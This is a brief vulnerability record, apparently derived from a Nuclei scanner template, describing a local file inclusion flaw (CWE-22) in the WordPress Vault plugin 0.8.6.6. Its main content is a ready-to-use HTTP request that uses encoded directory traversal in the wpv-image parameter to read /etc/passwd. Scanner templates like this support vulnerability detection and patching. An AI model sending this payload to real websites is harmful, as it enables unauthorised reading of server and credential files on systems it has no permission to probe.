# Vulnerability: WordPress Vault 0.8.6.6 - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`wp-vault-lfi.yaml`)

## Description
WordPress Vault 0.8.6.6 is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/?wpv-image=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

